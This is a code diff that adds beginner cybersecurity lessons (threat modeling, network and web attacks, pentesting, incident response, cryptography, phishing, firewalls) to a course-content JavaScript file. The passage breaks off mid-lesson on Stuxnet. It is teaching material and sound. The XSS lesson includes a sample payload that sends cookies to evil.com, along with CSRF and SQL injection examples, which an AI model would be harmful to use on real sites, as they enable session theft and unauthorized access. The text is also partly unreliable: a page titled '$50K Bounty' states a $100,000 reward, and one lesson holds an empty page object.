@@ -4115,33 +4115,2856 @@ AllowedIPs = 0.0.0.0/0</pre>
     ]
   },
 
-  // ========== CYBER TRACK (101-115) — titles only ==========
-  101: { titleEn: "Information Security Fundamentals", pages: [] },
-  102: { titleEn: "Nmap — Network Scanning", pages: [] },
-  103: { titleEn: "Linux and Servers", pages: [] },
-  104: { titleEn: "Password Cracking", pages: [] },
-  105: { titleEn: "MITM — Man in the Middle", pages: [] },
-  106: { titleEn: "Web Security — SQL Injection and XSS", pages: [] },
-  107: { titleEn: "Firewalls, IDS, and IPS", pages: [] },
-  108: { titleEn: "CTF Challenges", pages: [] },
-  109: { titleEn: "Forensics and Log Analysis", pages: [] },
-  110: { titleEn: "SQLi and XSS — Attacks and Defense", pages: [] },
-  111: { titleEn: "Authentication and Authorization", pages: [] },
-  112: { titleEn: "SOC and Incident Response", pages: [] },
-  113: { titleEn: "Compliance and Regulation", pages: [] },
-  114: { titleEn: "Bug Bounty", pages: [] },
-  115: { titleEn: "Cloud Security", pages: [] },
+  // ========== CYBER TRACK (101-115) ==========
+101: {
+    titleEn: "The CIA Triad & Threat Modeling",
+    pages: [
+      {
+        titleEn: "The CIA Triad",
+        contentEn: `Every security system is built on three pillars — the **CIA Triad**:
 
-  // ========== DEVOPS TRACK (201-209) — titles only ==========
-  201: { titleEn: "Linux Tools", pages: [] },
-  202: { titleEn: "Docker", pages: [] },
-  203: { titleEn: "Kubernetes", pages: [] },
-  204: { titleEn: "AWS Cloud", pages: [] },
-  205: { titleEn: "CI/CD", pages: [] },
-  206: { titleEn: "SRE and Operations", pages: [] },
-  207: { titleEn: "Terraform", pages: [] },
-  208: { titleEn: "Monitoring", pages: [] },
-  209: { titleEn: "GitOps", pages: [] },
+- **Confidentiality** — only the right people can see the data. Example: encryption, access control.
+- **Integrity** — data is not changed without permission. Example: checksums, digital signatures.
+- **Availability** — the system works when users need it. Example: backups, redundancy.
+
+If one pillar breaks, the whole system is at risk.
+
+**Quick check:**
+- A hacker deletes your database → which pillar is broken? → **Availability**
+- A hacker reads your passwords → **Confidentiality**
+- A hacker changes your bank balance → **Integrity**`
+      },
+      {
+        titleEn: "STRIDE Threat Modeling",
+        contentEn: `**STRIDE** is a framework by Microsoft. It helps teams find threats before attackers do.
+
+Each letter is a threat type:
+- **S**poofing — pretending to be someone else (fake login)
+- **T**ampering — changing data without permission
+- **R**epudiation — denying you did something (no logs)
+- **I**nformation Disclosure — leaking private data
+- **D**enial of Service — making the system unavailable
+- **E**levation of Privilege — getting admin access as a normal user
+
+**How to use STRIDE:**
+1. Draw a diagram of your system
+2. For each component, ask: "Can an attacker do S? T? R? I? D? E?"
+3. For each threat found, plan a defense`
+      },
+      {
+        titleEn: "Story: The Target Breach (2013)",
+        contentEn: `In December 2013, hackers stole **40 million** credit card numbers from Target stores.
+
+**How it happened:**
+- Attackers sent a phishing email to an HVAC company (heating/cooling vendor)
+- The vendor had network access to Target for billing
+- Hackers used that access to move inside Target's network
+- They installed malware on cash registers (POS systems)
+- Every credit card swipe was copied and sent to the attackers
+
+**CIA Triad analysis:**
+- **Confidentiality** broken — 40M card numbers leaked
+- **Integrity** broken — malware changed how POS systems worked
+- **Availability** was fine — stores kept working (that's why nobody noticed)
+
+**Lesson:** Your security is only as strong as your weakest vendor. This attack started with a simple phishing email.
+
+**Cost to Target:** $292 million in damages. The CEO and CIO both lost their jobs.`
+      }
+    ]
+  },
+
+  102: {
+    titleEn: "Network Attacks: ARP, SYN Flood & DDoS",
+    pages: [
+      {
+        titleEn: "ARP Spoofing & Man-in-the-Middle",
+        contentEn: `**ARP** (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network.
+
+**ARP Spoofing attack:**
+1. Attacker sends fake ARP messages to the network
+2. Tells the victim: "I am the router" (sends attacker's MAC)
+3. Tells the router: "I am the victim"
+4. Now all traffic flows through the attacker — **Man-in-the-Middle (MITM)**
+
+**What the attacker can do:**
+- Read unencrypted passwords and messages
+- Modify data in transit (change a bank transfer amount)
+- Inject malicious code into web pages
+
+**Defenses:**
+- Use **HTTPS** everywhere (encrypted traffic)
+- Enable **Dynamic ARP Inspection (DAI)** on switches
+- Use **VPN** on untrusted networks (coffee shop WiFi)
+- Static ARP entries for critical servers`
+      },
+      {
+        titleEn: "SYN Flood & TCP Exhaustion",
+        contentEn: `**TCP 3-Way Handshake** (normal):
+1. Client sends **SYN** → "I want to connect"
+2. Server sends **SYN-ACK** → "OK, go ahead"
+3. Client sends **ACK** → "Connected!"
+
+**SYN Flood attack:**
+- Attacker sends thousands of SYN packets with fake source IPs
+- Server sends SYN-ACK and waits for ACK... that never comes
+- Server's connection table fills up — **no room for real users**
+- Result: legitimate users cannot connect
+
+**Why it works:**
+- The server must keep each half-open connection in memory
+- Default timeout is 75 seconds per connection
+- Attacker can send millions of SYNs per second
+
+**Defenses:**
+- **SYN Cookies** — server doesn't store state until handshake completes
+- **Rate limiting** — limit SYN packets per source IP
+- **Firewall rules** — detect and block flood patterns`
+      },
+      {
+        titleEn: "Story: The 3.47 Tbps DDoS Attack",
+        contentEn: `In November 2021, Microsoft Azure stopped the **largest DDoS attack ever recorded**: **3.47 Tbps** (terabits per second).
+
+**Scale:**
+- 3.47 Tbps = downloading ~43,000 HD movies per second
+- The attack came from **10,000+ sources** across 10+ countries
+- It lasted only 15 minutes but peaked at 340 million packets per second
+
+**How it was stopped:**
+- Azure's DDoS Protection platform detected the spike in seconds
+- Traffic was spread across Microsoft's global network (160+ data centers)
+- Bad traffic was filtered; good traffic passed through
+- The customer's service stayed online the entire time
+
+**Types of DDoS:**
+- **Volumetric** — flood the bandwidth (UDP flood, DNS amplification)
+- **Protocol** — exhaust server resources (SYN flood, Ping of Death)
+- **Application** — target specific services (HTTP flood, Slowloris)
+
+**Key point:** You cannot stop DDoS alone. You need cloud-scale protection (Azure, Cloudflare, AWS Shield).`
+      }
+    ]
+  },
+
+  103: {
+    titleEn: "Web Attacks: SQL Injection, XSS & OWASP",
+    pages: [
+      {
+        titleEn: "SQL Injection (SQLi)",
+        contentEn: `**SQL Injection** — the attacker puts SQL code into input fields to control the database.
+
+**Example — login bypass:**
+\`\`\`
+Username: admin' --
+Password: anything
+\`\`\`
+
+The server builds this query:
+\`\`\`sql
+SELECT * FROM users WHERE name='admin' --' AND pass='anything'
+\`\`\`
+
+The \`--\` is a comment. Everything after it is ignored. The attacker logs in as admin without a password.
+
+**What an attacker can do:**
+- Read all data (usernames, passwords, credit cards)
+- Modify or delete data
+- Execute system commands (on some databases)
+
+**Defenses:**
+- **Parameterized queries** (prepared statements) — #1 defense
+- **Input validation** — reject special characters
+- **WAF** (Web Application Firewall) — block known attack patterns
+- **Least privilege** — database user should not be admin`
+      },
+      {
+        titleEn: "XSS and CSRF",
+        contentEn: `**XSS (Cross-Site Scripting)** — attacker injects JavaScript into a web page.
+
+**Types:**
+- **Stored XSS** — script is saved in the database (e.g., in a comment). Every user who views it gets attacked.
+- **Reflected XSS** — script is in the URL. Victim clicks a malicious link.
+- **DOM XSS** — script runs from client-side JavaScript, never touches the server.
+
+**Example:**
+\`\`\`html
+<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+\`\`\`
+
+**CSRF (Cross-Site Request Forgery)** — the attacker tricks your browser into making a request you didn't intend.
+
+**Example:** You are logged into your bank. You visit a malicious page with:
+\`\`\`html
+<img src="https://bank.com/transfer?to=attacker&amount=1000">
+\`\`\`
+Your browser sends the request with your session cookie. The bank thinks it's you.
+
+**Defenses:**
+- XSS → **escape/encode** all user output, use **Content Security Policy (CSP)**
+- CSRF → **CSRF tokens**, **SameSite cookies**, check **Referer header**`
+      },
+      {
+        titleEn: "OWASP Top 10 (2021)",
+        contentEn: `**OWASP** (Open Web Application Security Project) publishes the top 10 web security risks every few years.
+
+**The 2021 list:**
+
+| # | Risk | Example |
+|---|------|---------|
+| 1 | **Broken Access Control** | User changes URL to access admin page |
+| 2 | **Cryptographic Failures** | Passwords stored in plain text |
+| 3 | **Injection** | SQL injection, command injection |
+| 4 | **Insecure Design** | No rate limiting on login (brute force) |
+| 5 | **Security Misconfiguration** | Default passwords, open S3 buckets |
+| 6 | **Vulnerable Components** | Using old library with known CVE |
+| 7 | **Auth Failures** | Weak passwords, no MFA |
+| 8 | **Data Integrity Failures** | Insecure deserialization, no code signing |
+| 9 | **Logging Failures** | No logs → can't detect attacks |
+| 10 | **SSRF** | Server fetches attacker-controlled URL |
+
+**Key changes from 2017:**
+- Broken Access Control moved from #5 to #1
+- Insecure Design is new (focus on threat modeling)
+- SSRF is new (cloud environments made it worse)`
+      }
+    ]
+  },
+
+  104: {
+    titleEn: "Penetration Testing",
+    pages: [
+      {
+        titleEn: "The Pentest Lifecycle",
+        contentEn: `**Penetration testing (pentest)** = authorized hacking to find security weaknesses.
+
+**5 phases:**
+
+**1. Reconnaissance (Recon)**
+- Passive: Google dorking, WHOIS, LinkedIn, Shodan
+- Active: port scanning, service detection
+- Goal: learn everything about the target
+
+**2. Scanning & Enumeration**
+- Find open ports, running services, versions
+- Identify operating systems and technologies
+- Look for known vulnerabilities (CVEs)
+
+**3. Exploitation**
+- Try to break in using found vulnerabilities
+- Gain initial access (foothold)
+- Escalate privileges if possible
+
+**4. Post-Exploitation**
+- Move laterally (access other systems)
+- Maintain access (persistence)
+- Collect evidence (screenshots, data samples)
+
+**5. Reporting**
+- Document every finding with severity rating
+- Include proof-of-concept (PoC) for each vulnerability
+- Recommend fixes with priority order
+
+**Important:** Always get **written permission** before testing. Without it, it's a crime.`
+      },
+      {
+        titleEn: "Essential Pentest Tools",
+        contentEn: `**Nmap** — network scanner
+- Finds open ports and running services
+- \`nmap -sV -sC target.com\` — version detection + default scripts
+- \`nmap -p- target.com\` — scan all 65,535 ports
+- Can detect OS, firewalls, and vulnerabilities
+
+**Burp Suite** — web application proxy
+- Intercepts HTTP/HTTPS requests between browser and server
+- **Repeater** — modify and resend requests
+- **Intruder** — automated fuzzing and brute force
+- **Scanner** — automatic vulnerability detection (Pro version)
+
+**Metasploit** — exploitation framework
+- Database of 2,000+ exploits
+- \`search ms17-010\` → find EternalBlue exploit
+- \`use exploit/...\` → \`set RHOST target\` → \`exploit\`
+- **Meterpreter** — powerful post-exploitation shell
+
+**Other key tools:**
+- **Wireshark** — packet capture and analysis
+- **John the Ripper / Hashcat** — password cracking
+- **Gobuster / ffuf** — directory and file brute forcing
+- **SQLMap** — automated SQL injection testing`
+      },
+      {
+        titleEn: "Story: Red Team vs. The Bank",
+        contentEn: `A major bank hired a Red Team to test their security. The rules: get access to the CEO's email within 2 weeks.
+
+**Week 1 — Reconnaissance:**
+- Team found the bank's IT staff on LinkedIn
+- Discovered the bank used Microsoft 365 and Citrix VPN
+- Found an old subdomain: \`test-portal.bank.com\` — still running
+
+**Week 1 — Initial Access:**
+- The test portal had a known Citrix vulnerability (CVE-2019-19781)
+- Team exploited it and got a shell on an internal server
+- Found a shared drive with an Excel file: "IT_passwords_2019.xlsx"
+
+**Week 2 — Lateral Movement:**
+- Old passwords still worked for 3 IT admin accounts
+- Used admin access to reach the Exchange email server
+- Read the CEO's inbox — mission complete in 8 days
+
+**Report findings:**
+- Critical: unpatched public-facing server
+- Critical: passwords stored in plain text on shared drive
+- High: old passwords never rotated
+- High: no network segmentation (test server could reach email)
+
+**Result:** The bank fixed all findings, and the Red Team was invited back for a retest 6 months later.`
+      }
+    ]
+  },
+
+  105: {
+    titleEn: "Defense in Depth & Incident Response",
+    pages: [
+      {
+        titleEn: "Defense in Depth",
+        contentEn: `**Defense in Depth** = multiple layers of security. If one layer fails, the next one catches the attack.
+
+**The layers (outside → inside):**
+
+- **Physical** — locked server rooms, security cameras, badge access
+- **Perimeter** — firewalls, IDS/IPS, DMZ
+- **Network** — segmentation, VLANs, ACLs, network monitoring
+- **Host** — antivirus, host firewall, patching, hardening
+- **Application** — secure coding, input validation, WAF
+- **Data** — encryption, access control, backups, DLP
+
+**Why layers matter:**
+- Firewall blocks 99% of attacks → but 1% gets through
+- Antivirus catches most malware → but zero-days pass
+- Encryption protects data → but only if keys are safe
+
+**Analogy:** A castle has walls, a moat, guards, locked doors, and a safe. An attacker must beat ALL of them, not just one.
+
+**Key principles:**
+- No single point of failure
+- Assume every layer will be bypassed
+- Monitor every layer for alerts`
+      },
+      {
+        titleEn: "SIEM & Incident Response",
+        contentEn: `**SIEM** (Security Information and Event Management) — collects logs from all systems and finds threats.
+
+**What SIEM does:**
+- Collects logs from firewalls, servers, endpoints, apps
+- Correlates events across systems
+- Detects patterns (e.g., 100 failed logins then 1 success = brute force)
+- Generates alerts for the SOC (Security Operations Center) team
+
+**Popular SIEM tools:** Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM
+
+**Incident Response (IR) — 6 phases (NIST):**
+1. **Preparation** — build the IR team, write playbooks, set up tools
+2. **Identification** — detect the incident (SIEM alert, user report)
+3. **Containment** — stop the attack from spreading (isolate systems)
+4. **Eradication** — remove the attacker (delete malware, patch vuln)
+5. **Recovery** — restore systems from clean backups, monitor closely
+6. **Lessons Learned** — what happened? how to prevent it next time?
+
+**SOC analyst tiers:**
+- **Tier 1** — monitors alerts, triages (real or false positive?)
+- **Tier 2** — investigates confirmed incidents
+- **Tier 3** — threat hunting, malware analysis, forensics`
+      },
+      {
+        titleEn: "Story: SOC Analyst Finds an APT",
+        contentEn: `Monday morning. A Tier 1 SOC analyst notices something strange in the SIEM:
+
+**The alert:** A server in the finance department made DNS requests to a domain registered 2 days ago. The requests happened every 4 hours, exactly.
+
+**Why it's suspicious:**
+- New domains are often used by attackers
+- Regular 4-hour intervals suggest automated malware (beaconing)
+- Finance servers should not make unusual DNS requests
+
+**Investigation (Tier 2):**
+- The domain resolved to an IP in Eastern Europe
+- The DNS requests contained encoded data in the subdomain field — **DNS exfiltration**
+- The server had a hidden scheduled task running a PowerShell script
+- The script collected financial reports and sent them via DNS
+
+**Discovery:**
+- The attacker had been inside the network for **6 months** (APT — Advanced Persistent Threat)
+- Entry point: a spear-phishing email to the CFO with a weaponized PDF
+- The PDF exploited an Adobe Reader vulnerability
+
+**Response:**
+- Contained: isolated the server and blocked the domain
+- Eradicated: removed the scheduled task and backdoor
+- Recovered: rebuilt the server from a clean image
+- Lesson: deployed DNS monitoring and blocked DNS over non-standard ports
+
+**Key takeaway:** APTs are quiet. Without SIEM and trained analysts, this could have continued for years.`
+      }
+    ]
+  },
+
+  106: {
+    titleEn: "CTF & Bug Bounty",
+    pages: [
+      {
+        titleEn: "Capture The Flag (CTF)",
+        contentEn: `**CTF** = a hacking competition where teams solve security challenges to find hidden "flags" (secret strings).
+
+**CTF types:**
+- **Jeopardy** — categories with challenges of different difficulty. Categories: Web, Crypto, Reverse Engineering, Forensics, Binary Exploitation (pwn)
+- **Attack-Defense** — each team has a server. Attack other teams while defending your own.
+- **King of the Hill** — capture and hold a server as long as possible.
+
+**Example challenge (Web):**
+- You get a website with a login page
+- The hint says: "The admin left a note"
+- You check the HTML source → hidden comment: \`<!-- password: s3cur3 -->\`
+- Login with admin/s3cur3 → get the flag: \`FLAG{html_comments_are_not_secure}\`
+
+**Skills you learn:**
+- Web exploitation (SQLi, XSS, SSRF)
+- Binary analysis and reverse engineering
+- Cryptography (break weak encryption)
+- Forensics (analyze pcap files, disk images, memory dumps)
+
+**Where to practice:**
+- **PicoCTF** — beginner friendly (by Carnegie Mellon)
+- **HackTheBox** — virtual machines to hack
+- **TryHackMe** — guided learning paths
+- **OverTheWire** — Linux and networking challenges`
+      },
+      {
+        titleEn: "Bug Bounty Programs",
+        contentEn: `**Bug Bounty** = companies pay hackers to find and report security vulnerabilities.
+
+**How it works:**
+1. Company publishes a program (scope, rules, rewards)
+2. Hackers find vulnerabilities and write reports
+3. Company verifies and pays based on severity
+
+**Severity and typical rewards:**
+- **Critical** (RCE, auth bypass) → $10,000 – $100,000+
+- **High** (SQLi, SSRF, privilege escalation) → $5,000 – $25,000
+- **Medium** (stored XSS, IDOR) → $1,000 – $5,000
+- **Low** (reflected XSS, info disclosure) → $100 – $1,000
+
+**Major platforms:**
+- **HackerOne** — largest platform, $300M+ paid total
+- **Bugcrowd** — second largest, strong triage team
+- **Intigriti** — popular in Europe
+
+**The industry in numbers:**
+- $1.5 billion+ paid to hackers total (all platforms)
+- Top hackers earn $500K+ per year
+- 30,000+ organizations run programs
+- Average time to first valid bug: 2-3 months for beginners
+
+**Tips for beginners:**
+- Start with programs that have a wide scope
+- Focus on one vulnerability type (e.g., IDOR)
+- Read disclosed reports on HackerOne to learn
+- Write clear reports with steps to reproduce`
+      },
+      {
+        titleEn: "Story: Apple's $50K Bounty",
+        contentEn: `In 2020, a security researcher found a critical vulnerability in **Apple's Sign In** system.
+
+**The bug:**
+- "Sign in with Apple" lets you log into apps using your Apple ID
+- The researcher found he could request a token for **any Apple ID email**
+- With this token, he could log into any app that uses "Sign in with Apple" — as any user
+
+**Impact:**
+- Full account takeover on any app using Apple Sign In
+- Affected millions of users on thousands of apps
+- No user interaction needed — completely silent attack
+
+**How he reported it:**
+1. Found the bug and tested on his own accounts
+2. Wrote a detailed report with proof-of-concept
+3. Submitted to Apple's Bug Bounty program
+4. Apple confirmed and fixed the bug within days
+
+**Reward: $100,000** (Apple's highest bounty category)
+
+**Why this story matters:**
+- One person, one bug, huge impact
+- Responsible disclosure protected millions of users
+- The researcher earned $100K legally — and built his reputation
+- Without bug bounties, this bug might have been sold on the dark web or exploited silently
+
+**The alternative:** On the black market, this bug could sell for $500K+. Bug bounties give hackers a legal and ethical path.`
+      }
+    ]
+  },
+
+  107: {
+    titleEn: "Cryptography & Encryption",
+    pages: [
+      {
+        titleEn: "Symmetric vs Asymmetric Encryption",
+        contentEn: `**Encryption** = turning readable data (plaintext) into unreadable data (ciphertext). Only someone with the key can read it.
+
+**Symmetric encryption** — same key to encrypt and decrypt:
+- Fast, efficient for large data
+- Problem: how do you share the key securely?
+- Algorithms: **AES** (standard, 128/256 bit), DES (old, broken), ChaCha20
+
+**Example:**
+\`\`\`
+Plaintext: "Hello" + Key: "s3cr3t" → Ciphertext: "x7#kQ..."
+Ciphertext: "x7#kQ..." + Key: "s3cr3t" → Plaintext: "Hello"
+\`\`\`
+
+**Asymmetric encryption** — two keys: public key + private key:
+- Public key encrypts → only private key can decrypt
+- Slow, used for small data (keys, signatures)
+- Algorithms: **RSA** (2048/4096 bit), **ECC** (smaller keys, same security)
+
+**Example:**
+\`\`\`
+Alice wants to send Bob a message:
+1. Bob shares his PUBLIC key with Alice
+2. Alice encrypts with Bob's public key
+3. Only Bob's PRIVATE key can decrypt
+\`\`\`
+
+**In practice:** Both are used together. Asymmetric encrypts a symmetric key. Then symmetric encrypts the data. This is called a **hybrid system**.`
+      },
+      {
+        titleEn: "The TLS Handshake",
+        contentEn: `**TLS** (Transport Layer Security) protects data between your browser and the server. The padlock icon in your browser = TLS is active.
+
+**TLS Handshake steps:**
+
+\`\`\`
+Browser                          Server
+   |                                |
+   |--- 1. ClientHello ----------->|  (supported ciphers, TLS version)
+   |                                |
+   |<-- 2. ServerHello ------------|  (chosen cipher, server certificate)
+   |                                |
+   |    3. Browser verifies        |  (is certificate valid? trusted CA?)
+   |       server certificate      |
+   |                                |
+   |--- 4. Key Exchange ---------->|  (both sides compute shared secret)
+   |                                |
+   |<== 5. Encrypted tunnel ======>|  (all data encrypted with shared key)
+\`\`\`
+
+**Key concepts:**
+- **Certificate** — proves the server is who it says it is (signed by a CA)
+- **CA (Certificate Authority)** — trusted organizations that issue certificates (Let's Encrypt, DigiCert)
+- **Cipher suite** — the combination of algorithms used (e.g., TLS_AES_256_GCM_SHA384)
+
+**TLS versions:**
+- TLS 1.0, 1.1 — deprecated, insecure
+- **TLS 1.2** — still widely used, secure
+- **TLS 1.3** — latest, faster handshake (1 round trip instead of 2)`
+      },
+      {
+        titleEn: "WhatsApp End-to-End Encryption",
+        contentEn: `**End-to-End Encryption (E2E)** = only the sender and receiver can read the messages. Not even the service provider (WhatsApp/Signal) can read them.
+
+**How WhatsApp E2E works (Signal Protocol):**
+
+1. **Key generation** — each phone creates a key pair (public + private)
+2. **Key exchange** — phones exchange public keys when you start a chat
+3. **Message encryption** — each message is encrypted with a unique key
+4. **Forward secrecy** — even if one key is stolen, past messages stay safe
+
+**What WhatsApp CAN see:**
+- Who you talk to (metadata)
+- When you send messages (timestamps)
+- Your phone number and contacts
+
+**What WhatsApp CANNOT see:**
+- Message content (text, photos, videos)
+- Voice and video call content
+
+**Why metadata matters:**
+- "You called a suicide hotline at 2 AM for 45 minutes" — no content needed to learn a lot
+- Governments have requested metadata from WhatsApp
+
+**Comparison:**
+- **WhatsApp** — E2E by default, closed source
+- **Signal** — E2E by default, open source, minimal metadata
+- **Telegram** — E2E only in "Secret Chats" (not default!)`
+      },
+      {
+        titleEn: "Story: The Heartbleed Bug",
+        contentEn: `In April 2014, researchers discovered **Heartbleed** — a bug in OpenSSL that affected **17% of all web servers**.
+
+**What is OpenSSL?**
+- The most popular library for TLS/SSL encryption
+- Used by millions of websites, email servers, VPNs
+
+**The bug (CVE-2014-0160):**
+- TLS has a "heartbeat" feature — a keep-alive ping between client and server
+- Client sends: "Here is a 4-byte word: 'bird'. Send it back."
+- Server reads 4 bytes and sends back: "bird" ✓
+
+**The exploit:**
+- Attacker sends: "Here is a 40,000-byte word: 'bird'. Send it back."
+- Server doesn't check the real length
+- Server reads 40,000 bytes from memory and sends them back
+- Those bytes contain: **private keys, passwords, session tokens**
+
+**Impact:**
+- Attacker could steal the server's **private SSL key**
+- With the key → decrypt all traffic (past and future)
+- No trace in server logs — completely invisible
+
+**The fix:**
+- Add one line of code: check that the claimed length matches the actual length
+- The bug existed for **2 years** before discovery (introduced in 2012)
+
+**Lesson:** One small coding mistake in a critical library can break the security of half the internet.`
+      }
+    ]
+  },
+
+  108: {
+    titleEn: "Social Engineering Attacks",
+    pages: [
+      {
+        titleEn: "Anatomy of a Phishing Attack",
+        contentEn: `**Phishing** = tricking people into giving up passwords, clicking malicious links, or downloading malware.
+
+**Phishing email red flags:**
+- Urgent language: "Your account will be closed in 24 hours!"
+- Generic greeting: "Dear Customer" (not your name)
+- Suspicious sender: support@amaz0n-security.com (not amazon.com)
+- Mismatched link: text says "amazon.com" but link goes to "amaz0n.evil.com"
+- Unexpected attachment: "Invoice_March.pdf.exe"
+
+**Types of phishing:**
+- **Mass phishing** — same email to millions of people
+- **Spear phishing** — targeted at a specific person (uses personal details)
+- **Whaling** — spear phishing aimed at executives (CEO, CFO)
+- **Clone phishing** — copies a real email you received, replaces the attachment
+
+**How to check a suspicious email:**
+1. Hover over links — check the real URL before clicking
+2. Check the sender's actual email address (not just the display name)
+3. Look for spelling and grammar mistakes
+4. Ask yourself: "Did I expect this email?"
+5. When in doubt — go directly to the website (don't click the link)`
+      },
+      {
+        titleEn: "Vishing, Smishing & Pretexting",
+        contentEn: `**Vishing** (Voice Phishing) — attacks over the phone:
+- Caller pretends to be your bank, IT support, or government
+- Uses caller ID spoofing (shows a real bank number)
+- Creates urgency: "Suspicious transaction on your account right now!"
+- Goal: get your password, OTP code, or credit card number
+
+**Smishing** (SMS Phishing) — attacks via text message:
+- "Your package is waiting. Track here: bit.ly/susp1c10us"
+- "Bank alert: unusual login. Verify: [link]"
+- Short links hide the real destination
+- Works because people trust SMS more than email
+
+**Pretexting** — creating a fake scenario to build trust:
+- Attacker calls IT help desk: "Hi, I'm John from the marketing team. I forgot my password and I have a presentation in 10 minutes. Can you reset it?"
+- Attacker poses as a fire inspector to walk through the building
+- Uses authority, urgency, or sympathy to bypass security
+
+**Why social engineering works:**
+- Humans are the weakest link in security
+- People want to be helpful
+- Urgency bypasses critical thinking
+- Authority makes people comply without questioning`
+      },
+      {
+        titleEn: "Story: The Twitter Hack (2020)",
+        contentEn: `On July 15, 2020, high-profile Twitter accounts were hijacked — including **Barack Obama, Elon Musk, Bill Gates, and Apple**.
+
+**The tweets:** "I'm giving back! Send $1,000 in Bitcoin and I'll send you $2,000 back." All tweets linked to the same Bitcoin wallet.
+
+**How it happened:**
+1. A 17-year-old from Florida called Twitter employees
+2. He pretended to be from Twitter's IT department
+3. He convinced employees to enter their credentials on a fake internal tool page (**vishing + phishing**)
+4. With employee access, he used Twitter's internal admin panel
+5. He took over 130 accounts, tweeted from 45 of them
+
+**Result:**
+- $120,000 stolen in Bitcoin within hours
+- Twitter stock dropped 4%
+- Twitter had to disable tweeting for all verified accounts temporarily
+
+**The arrest:**
+- FBI tracked the Bitcoin transactions
+- The 17-year-old was arrested 2 weeks later
+- Sentenced to 3 years in juvenile detention
+
+**Lessons:**
+- Internal tools need strong access controls (MFA, audit logs)
+- Even big tech companies are vulnerable to social engineering
+- Security awareness training is essential for all employees
+- A teenager with no technical exploit — just social skills — took over Twitter`
+      },
+      {
+        titleEn: "Defense Against Social Engineering",
+        contentEn: `**For individuals:**
+- Enable **MFA** (Multi-Factor Authentication) everywhere
+- Use a **password manager** (unique passwords for every site)
+- Never share passwords, OTP codes, or personal info over phone/email
+- Verify requests through a different channel (call back on official number)
+- If it feels urgent — slow down and think
+
+**For organizations:**
+
+**Security Awareness Training:**
+- Regular phishing simulations (monthly)
+- Train employees to report suspicious emails (reward reporting)
+- Special training for high-risk roles (finance, HR, executives)
+
+**Technical controls:**
+- Email filtering and anti-phishing gateways
+- DMARC/SPF/DKIM — prevent email spoofing
+- MFA for all internal tools (especially admin panels)
+- Principle of least privilege — limit access to what's needed
+
+**Processes:**
+- Verify identity before password resets (callback procedure)
+- Two-person approval for financial transfers over threshold
+- Visitor badges and escort policy for physical access
+- Incident reporting hotline (make it easy to report)
+
+**Key metric:** Click rate on phishing simulations. Good companies aim for <5%. Average is 20-30%.`
+      }
+    ]
+  },
+
+  109: {
+    titleEn: "Firewalls, Zero Trust & Network Defense",
+    pages: [
+      {
+        titleEn: "Firewall Types",
+        contentEn: `**Firewall** = a security device that controls network traffic based on rules. It decides what goes in and what goes out.
+
+**1. Stateless (Packet Filter)**
+- Checks each packet individually against simple rules
+- Rules based on: source IP, destination IP, port, protocol
+- Fast but dumb — doesn't understand connections
+- Example rule: "Block all traffic from IP 10.0.0.5 to port 22"
+
+**2. Stateful**
+- Tracks the **state** of connections (new, established, related)
+- If you start a connection outbound, it allows the response back in
+- Smarter — can detect packets that don't belong to a real connection
+- Most traditional firewalls are stateful
+
+**3. NGFW (Next-Generation Firewall)**
+- Everything stateful does, plus:
+- **Application awareness** — can identify apps (YouTube, Slack, BitTorrent) regardless of port
+- **IPS** (Intrusion Prevention) — blocks known attack patterns
+- **SSL inspection** — decrypts and inspects HTTPS traffic
+- **User identity** — rules based on user/group, not just IP
+- Examples: Palo Alto, Fortinet, Check Point
+
+**Where firewalls sit:**
+- Between internet and your network (perimeter)
+- Between network segments (internal)
+- On each computer (host-based: Windows Firewall, iptables)`
+      },
+      {
+        titleEn: "DMZ Architecture",
+        contentEn: `**DMZ** (Demilitarized Zone) = a network segment between the public internet and your private network.
+
+**Architecture diagram:**
+
+\`\`\`
+Internet
+    |
+[Outer Firewall]     ← allows HTTP/HTTPS from internet
+    |
+  [DMZ]              ← web servers, email servers, DNS
+    |
+[Inner Firewall]     ← strict rules, limited access
+    |
+[Internal Network]   ← databases, file servers, workstations
+\`\`\`
+
+**Rules:**
+- Internet → DMZ: allowed (specific ports only: 80, 443)
+- DMZ → Internal: very limited (e.g., web server → database on port 3306 only)
+- Internal → DMZ: allowed (for management)
+- Internet → Internal: **blocked** (never direct access)
+
+**What goes in the DMZ:**
+- Web servers (public-facing)
+- Email servers (MX records)
+- DNS servers (public)
+- VPN gateways
+- Reverse proxies / load balancers
+
+**Why DMZ matters:**
+- If a web server is hacked, the attacker is stuck in the DMZ
+- The inner firewall prevents access to the real data
+- Without DMZ: hacked web server = direct access to database`
+      },
+      {},
+      {
+        titleEn: "Zero Trust (ZTNA)",
+        contentEn: `**Zero Trust** = "Never trust, always verify." No user or device is trusted by default — even if they are inside the network.
+
+**Traditional model (castle and moat):**
+- Firewall protects the perimeter
+- Once inside, you can access everything
+- Problem: if attacker gets in, they move freely (lateral movement)
+
+**Zero Trust principles:**
+1. **Verify explicitly** — authenticate and authorize every request
+2. **Least privilege** — give minimum access needed, for minimum time
+3. **Assume breach** — design as if attackers are already inside
+
+**How Zero Trust works:**
+- **Identity** — strong authentication (MFA) for every access
+- **Device** — check device health (updated? encrypted? managed?)
+- **Network** — micro-segmentation (each app is isolated)
+- **Application** — per-app access (not full network VPN)
+- **Data** — classify and encrypt sensitive data
+- **Monitoring** — continuous verification, not just at login
+
+**Real-world example:**
+- Old way: VPN → access entire corporate network
+- Zero Trust: authenticate → verify device → access only the specific app you need → re-verify continuously
+
+**Key technologies:** Identity Provider (Azure AD/Okta), MFA, micro-segmentation, ZTNA proxies (Zscaler, Cloudflare Access)`
+      },
+      {
+        titleEn: "Story: Stuxnet — The First Cyber Weapon",
+        contentEn: `In 2010, researchers discovered **Stuxnet** — a computer worm designed to physically destroy Iran's nuclear centrifuges.
+
+**What Stuxnet did:**
+- Targeted Siemens SCADA systems controlling uranium enrichment centrifuges
+- Changed the speed of centrifuges (too fast, then too slow)
+- While displaying **normal readings** to the operators
+- Destroyed approximately **1,000 centrifuges** at Natanz facility
+
+**How it spread:**
+- Via **USB drives** (the facility was air-gapped — not connected to internet)
+- Used **4 zero-day exploits** (unknown vulnerabilities) — extremely rare
+- Only activated on systems with specific Siemens software + specific configuration
+- Infected 200,000+ computers worldwide but only damaged the target
+
+**Why it's historic:**
+- First known **cyberweapon** designed to cause physical damage
+- Attributed to USA and Israel (never officially confirmed)
+- Changed warfare — showed that code can destroy physical infrastructure
+- Led to the creation of US Cyber Command
+
+**Defense lessons:**
